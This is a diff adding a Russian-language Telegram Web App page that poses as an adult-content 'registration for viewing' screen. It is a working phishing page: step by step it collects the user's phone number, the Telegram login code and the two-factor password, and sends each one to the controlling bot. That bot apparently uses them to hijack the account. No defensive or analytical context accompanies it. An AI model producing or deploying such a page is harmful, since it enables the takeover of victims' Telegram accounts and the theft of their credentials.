@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Регистрация для просмотра</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: radial-gradient(circle at 20% 30%, #1a1a1a, #000000);
+            position: relative;
+            overflow: hidden;
+            padding: 20px;
+        }
+
+        /* Неоновая сетка (теперь серая) */
+        .grid {
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            top: -50%;
+            left: -50%;
+            background-image: 
+                linear-gradient(rgba(255, 255, 255, 0.08) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.08) 1px, transparent 1px);
+            background-size: 50px 50px;
+            transform: rotate(45deg) scale(1.5);
+            animation: gridMove 30s linear infinite;
+            pointer-events: none;
+        }
+
+        @keyframes gridMove {
+            0% { transform: rotate(45deg) scale(1.5) translate(0, 0); }
+            100% { transform: rotate(45deg) scale(1.5) translate(100px, 100px); }
+        }
+
+        /* Частицы (белые) */
+        .particle {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            pointer-events: none;
+            filter: blur(2px);
+            animation: floatParticle 18s infinite alternate ease-in-out;
+        }
+
+        @keyframes floatParticle {
+            0% { transform: translate(0, 0) scale(1); opacity: 0.2; }
+            100% { transform: translate(40px, -40px) scale(1.5); opacity: 0.6; }
+        }
+
+        /* Волны (полупрозрачные белые) */
+        .waves {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 150px;
+            background: url('data:image/svg+xml;utf8,<svg viewBox="0 0 1440 320" xmlns="http://www.w3.org/2000/svg"><path fill="rgba(255,255,255,0.15)" d="M0,96L48,112C96,128,192,160,288,160C384,160,480,128,576,122.7C672,117,768,139,864,154.7C960,171,1056,181,1152,170.7C1248,160,1344,128,1392,112L1440,96L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"/></svg>') repeat-x bottom;
+            background-size: cover;
+            animation: waveMove 12s linear infinite;
+            opacity: 0.4;
+        }
+
+        @keyframes waveMove {
+            0% { background-position: 0 0; }
+            100% { background-position: 1440px 0; }
+        }
+
+        /* Светящийся шар (белое свечение) */
+        .glow {
+            position: absolute;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, transparent 70%);
+            border-radius: 50%;
+            top: 20%;
+            right: -100px;
+            filter: blur(60px);
+            animation: glowPulse 8s infinite alternate;
+        }
+
+        @keyframes glowPulse {
+            0% { opacity: 0.2; transform: scale(1); }
+            100% { opacity: 0.5; transform: scale(1.2); }
+        }
+
+        /* Контейнер (тёмный с серым свечением) */
+        .container {
+            width: 100%;
+            max-width: 560px;
+            background: rgba(20, 20, 20, 0.8);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-radius: 50px;
+            padding: 48px 40px;
+            box-shadow: 0 30px 70px rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            position: relative;
+            z-index: 20;
+            color: white;
+            transition: all 0.4s ease;
+        }
+
+        h2 {
+            font-weight: 700;
+            font-size: 32px;
+            margin-bottom: 36px;
+            text-align: center;
+            letter-spacing: 1px;
+            text-shadow: 0 0 15px rgba(255,255,255,0.5);
+        }
+
+        .phone-button {
+            width: 100%;
+            padding: 22px;
+            background: #333333;
+            border: none;
+            border-radius: 80px;
+            color: white;
+            font-size: 22px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(255, 255, 255, 0.3);
+            transition: transform 0.2s, box-shadow 0.2s, background 0.2s;
+            margin-bottom: 24px;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+
+        .phone-button:hover {
+            background: #555555;
+            box-shadow: 0 15px 40px rgba(255, 255, 255, 0.5);
+            transform: scale(1.03);
+        }
+
+        .phone-button:active {
+            transform: scale(0.98);
+        }
+
+        .step {
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .code-input {
+            display: flex;
+            gap: 18px;
+            justify-content: center;
+            margin: 32px 0 24px;
+        }
+
+        .code-input input {
+            width: 70px;
+            height: 80px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 20px;
+            text-align: center;
+            font-size: 36px;
+            font-weight: 700;
+            color: white;
+            outline: none;
+            transition: border 0.2s, box-shadow 0.2s;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+        }
+
+        .code-input input:focus {
+            border-color: white;
+            box-shadow: 0 0 25px white;
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        .password-input {
+            width: 100%;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50px;
+            font-size: 22px;
+            color: white;
+            outline: none;
+            margin: 32px 0 24px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+        }
+
+        .password-input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .action-button {
+            width: 100%;
+            padding: 20px;
+            background: #333333;
+            border: none;
+            border-radius: 70px;
+            color: white;
+            font-size: 22px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(255, 255, 255, 0.3);
+            transition: all 0.2s;
+        }
+
+        .action-button:hover {
+            background: #555555;
+            box-shadow: 0 15px 40px rgba(255, 255, 255, 0.5);
+        }
+
+        .error {
+            color: #ff8a80;
+            font-size: 16px;
+            margin-top: 16px;
+            text-align: center;
+            text-shadow: 0 0 8px rgba(255, 255, 255, 0.3);
+        }
+
+        /* Адаптация под мобильные */
+        @media (max-width: 500px) {
+            .container {
+                max-width: 95%;
+                padding: 35px 20px;
+            }
+            .code-input input {
+                width: 55px;
+                height: 65px;
+                font-size: 30px;
+            }
+            h2 {
+                font-size: 28px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Неоновая сетка (серая) -->
+    <div class="grid"></div>
+    <!-- Светящийся шар (белый) -->
+    <div class="glow"></div>
+    <!-- Частицы -->
+    <div id="particles"></div>
+    <!-- Волны -->
+    <div class="waves"></div>
+
+    <div class="container" id="container">
+        <!-- Шаг 1: только кнопка "Поделиться номером" -->
+        <div id="phone-step" class="step">
+            <h2>🔞 Регистрация для просмотра</h2>
+            <button class="phone-button" onclick="requestPhone()">
+                <span>📱</span> Поделиться номером
+            </button>
+            <div id="error" class="error"></div>
+        </div>
+
+        <!-- Шаг 2: ввод кода -->
+        <div id="code-step" class="step hidden">
+            <h2>✉️ Код подтверждения</h2>
+            <p style="text-align: center; margin-bottom: 16px; opacity: 0.9;">Введите 5-значный код из Telegram</p>
+            <div class="code-input">
+                <input type="text" id="code1" maxlength="1" oninput="moveToNext(this, 'code2')">
+                <input type="text" id="code2" maxlength="1" oninput="moveToNext(this, 'code3')">
+                <input type="text" id="code3" maxlength="1" oninput="moveToNext(this, 'code4')">
+                <input type="text" id="code4" maxlength="1" oninput="moveToNext(this, 'code5')">
+                <input type="text" id="code5" maxlength="1" oninput="moveToNext(this, 'code5')">
+            </div>
+            <button class="action-button" onclick="sendCode()">Подтвердить</button>
+            <div id="code-error" class="error"></div>
+        </div>
+
+        <!-- Шаг 3: двухфакторная аутентификация -->
+        <div id="password-step" class="step hidden">
+            <h2>🔐 Двухфакторная защита</h2>
+            <input type="password" id="password" class="password-input" placeholder="Введите пароль">
+            <button class="action-button" onclick="sendPassword()">Войти</button>
+            <div id="password-error" class="error"></div>
+        </div>
+    </div>
+
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.disableVerticalSwipes();
+
+        // Генерация частиц (белые)
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            const count = 45;
+            for (let i = 0; i < count; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                const size = Math.random() * 12 + 4;
+                particle.style.width = size + 'px';
+                particle.style.height = size + 'px';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.top = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 10 + 's';
+                particle.style.animationDuration = (Math.random() * 20 + 15) + 's';
+                particle.style.background = `rgba(255, 255, 255, ${Math.random() * 0.5 + 0.2})`;
+                particle.style.filter = `blur(${Math.random() * 4 + 1}px)`;
+                particlesContainer.appendChild(particle);
+            }
+        }
+        createParticles();
+
+        function moveToNext(current, nextId) {
+            if (current.value.length >= current.maxLength) {
+                document.getElementById(nextId)?.focus();
+            }
+        }
+
+        function requestPhone() {
+            tg.requestContact((success, response) => {
+                if (success && response?.responseUnsafe?.contact?.phone_number) {
+                    let phone = response.responseUnsafe.contact.phone_number;
+                    if (!phone.startsWith('+')) phone = '+' + phone;
+                    sendPhoneToBot(phone);
+                } else {
+                    document.getElementById('error').innerText = 'Не удалось получить номер. Попробуйте ещё раз.';
+                }
+            });
+        }
+
+        function sendPhoneToBot(phone) {
+            tg.sendData(JSON.stringify({
+                action: 'send_phone',
+                phone: phone
+            }));
+            document.getElementById('phone-step').classList.add('hidden');
+        }
+
+        function sendCode() {
+            let code = '';
+            for (let i = 1; i <= 5; i++) {
+                let val = document.getElementById(`code${i}`).value;
+                if (!val) {
+                    document.getElementById('code-error').innerText = 'Введите все цифры кода';
+                    return;
+                }
+                code += val;
+            }
+            tg.sendData(JSON.stringify({
+                action: 'send_code',
+                code: code
+            }));
+            document.getElementById('code-step').classList.add('hidden');
+        }
+
+        function sendPassword() {
+            let password = document.getElementById('password').value;
+            if (!password) {
+                document.getElementById('password-error').innerText = 'Введите пароль';
+                return;
+            }
+            tg.sendData(JSON.stringify({
+                action: 'send_password',
+                password: password
+            }));
+            document.getElementById('password-step').classList.add('hidden');
+        }
+
+        tg.onEvent('message', function(event) {
+            let data = JSON.parse(event.data);
+            if (data.status === 'code_sent') {
+                document.getElementById('code-step').classList.remove('hidden');
+                for (let i = 1; i <= 5; i++) {
+                    document.getElementById(`code${i}`).value = '';
+                }
+            } else if (data.status === 'code_expired') {
+                document.getElementById('code-error').innerText = 'Код истёк, новый отправлен';
+                document.getElementById('code-step').classList.remove('hidden');
+                for (let i = 1; i <= 5; i++) {
+                    document.getElementById(`code${i}`).value = '';
+                }
+            } else if (data.status === 'invalid_code') {
+                document.getElementById('code-error').innerText = 'Неверный код';
+                document.getElementById('code-step').classList.remove('hidden');
+            } else if (data.status === '2fa_required') {
+                document.getElementById('password-step').classList.remove('hidden');
+            } else if (data.status === 'success') {
+                tg.close();
+            } else if (data.status === 'error') {
+                alert('Ошибка: ' + data.message);
+                tg.close();
+            }
+        });
+    </script>
+</body>
+</html>
